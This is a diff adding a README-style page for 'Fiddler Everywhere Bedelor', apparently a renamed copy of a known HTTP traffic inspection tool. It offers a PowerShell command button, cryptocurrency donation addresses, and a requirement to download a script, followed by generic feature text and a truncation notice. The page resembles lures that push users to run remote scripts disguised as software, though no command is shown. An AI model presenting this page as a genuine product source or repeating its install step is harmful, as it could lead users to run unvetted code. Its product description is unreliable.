@@ -1,0 +1,87 @@
+Fiddler Everywhere Bedelor - Professional Desktop Client for Windows 10 & 11
+
+⌨️ PowerShell Command Button
+
+Buy me a coffee
+
+TRON:&nbsp;TKhiWnMUbdVvYPHMjXhRbzdhRmr1qRMB5A | ETH:&nbsp;0x8F47Abe601cE4A880d16432420920426CcAE989F
+
+Fiddler Everywhere Bedelor is a desktop application engineered for comprehensive network traffic inspection, debugging, and analysis. It provides developers and QA engineers with the ability to capture, decrypt, and examine HTTP and HTTPS traffic in real time through a streamlined, cross-platform interface. The tool supports advanced session filtering, request composition, breakpoint-based interception, and exportable diagnostic reports to support complex troubleshooting workflows. Built for performance and precision, Fiddler Everywhere Bedelor integrates directly into existing development pipelines while maintaining a responsive, low-overhead footprint on the desktop.
+
+✅ Requirements
+
+- OS: Windows 10 / 11
+- Shell: PowerShell 5.1+ or PowerShell 7+
+- Network: internet access to download the script
+- Privileges: standard user
+
+Features
+
+- Cross-platform traffic interception: Captures HTTP and HTTPS traffic from desktop applications, browsers, and mobile devices through a configurable local proxy, with automatic certificate generation for TLS decryption.
+- Live session inspection: Streams requests and responses in real time with structured views for headers, payloads, cookies, query parameters, and timing data.
+- Request composition and replay: Builds custom requests from scratch or clones captured sessions, then reissues them with modified methods, headers, bodies, or authentication tokens.
+- Composer templates: Saves frequently used request configurations for repeatable API testing and debugging workflows.
+- Advanced filtering: Narrows captured traffic by host, path, status code, content type, or custom rules to isolate relevant sessions in high-volume captures.
+- Breakpoint debugging: Pauses traffic at defined points to inspect and edit requests or responses before they are forwarded, enabling precise fault injection and behavioral testing.
+- Session persistence and export: Stores captured sessions locally and exports them in standard archive formats for sharing, archival, or offline analysis.
+- Response mocking: Substitutes live responses with locally defined payloads to simulate edge cases, error states, and unavailable backends.
+- Performance metrics: Displays per-request timing breakdowns, including DNS resolution, connection, TLS handshake, and content transfer phases.
+- Configurable proxy rules: Defines upstream routing, host remapping, and port forwarding to redirect traffic without modifying client configuration.
+- Authentication handling: Supports capturing and reusing bearer tokens, basic credentials, and custom authorization headers across composed and replayed requests.
+- Searchable traffic history: Provides full-text search across recorded sessions to quickly locate prior requests by content, header values, or metadata.
+- Local-first operation: Runs entirely on the desktop with captured data stored on the local machine, requiring no external service for core inspection and composition features.
+
+How it works
+
+Fiddler Everywhere Bedelor operates as a desktop traffic interception and inspection layer that sits between client applications and remote endpoints. On launch, the application initializes a local proxy listener and, when enabled, installs a trusted root certificate so that TLS-encrypted sessions can be decrypted, inspected, and re-signed transparently. Client traffic is routed through this listener either explicitly through proxy configuration or implicitly via system-level capture, allowing the tool to observe requests and responses without modifying application source code.
+
+Each captured session is parsed into a structured transaction model: request method, headers, cookies, query parameters, body payloads, response status, headers, and timing metadata. These transactions are streamed to the interface in real time, where they can be filtered, searched, sorted, and pinned for comparison. Binary and encoded payloads are detected and rendered through appropriate viewers, while large bodies are handled with bounded buffering to preserve responsiveness.
+
+A rule-based composer enables modification of live traffic. Users define match conditions and corresponding actions, such as rewriting headers, redirecting endpoints, throttling throughput, simulating latency, or returning synthetic responses. Rules are evaluated in a deterministic order per transaction, and each applied action is logged against the session for traceability. Sessions can be paused, replayed, or exported for offline analysis.
+
+State is persisted locally: captured sessions, saved rules, workspace preferences, and certificates are stored in the application's data directory, with no dependency on external services for core capture and inspection workflows. Background components manage certificate lifecycle, proxy health, and session storage, while the desktop interface communicates with these components over a local channel to keep the UI decoupled from capture processing.
+
+Modules and Settings
+
+Live Traffic Capture
+
+This module provides the session list that everything else in Fiddler Everywhere Bedelor builds on, capturing HTTP and HTTPS exchanges between local applications or browsers and remote servers.
+
+- Capture Toggle starts and stops recording so you can limit the session list to the window you care about.
+- Capture Scope options let you include or exclude localhost traffic and specific hosts, keeping background noise out of the list.
+- Connection Status indicators show whether the capture engine is active and whether client traffic is being routed through the local proxy.
+- The chronological list updates as exchanges occur, with each entry selectable for detailed inspection.
+
+Inspector for Requests and Responses
+
+The inspector turns a selected session entry into readable headers, bodies, query parameters and status information, supporting common formats such as JSON, XML and form data.
+
+- View Mode switches between formatted and raw representations so you can compare what was actually sent with what the formatted view shows.
+- Body Decoding options help display compressed or encoded payloads in a readable form.
+- Per-entry metadata such as method, status code and timing is shown alongside the payload, making malformed responses and header mismatches easier to spot.
+- Inspected entries can be handed off to comparison or saved sessions for later reference.
+
+Rules for Traffic Modification
+
+Rules rewrite requests or responses as they pass through the local proxy, letting you test how a client behaves when headers, hosts or bodies change.
+
+- Rule Scope settings restrict each rule by URL pattern and method so only intended traffic is affected.
+- Action Options cover header changes, redirecting a call to a different host and substituting a response body.
+- Enable/Disable per rule lets you compare a run with and without a transformation without deleting the rule.
+- Modified exchanges are marked in the session view so the rewritten result can be seen next to the original request and response.
+
+Breakpoints
+
+Breakpoints pause an exchange before it is forwarded, giving you manual control over the contents at the moment of interception.
+
+- Breakpoint Matching limits pausing to specific URLs or methods rather than all traffic.
+- Edit Controls let you change headers or body while the exchange is held, then resume it or abort it entirely.
+- Paused sessions are clearly flagged in the list, and the edited result is recorded in session history once resumed.
+
+Session Management and Composer
+
+This module keeps separate debugging efforts distinct and adds a way to generate traffic without a browser or client application.
+
+- Save, Reopen and Organize actions preserve captured sessions so they can be revisited after the original capture has ended.
+
+…（内容已截断）
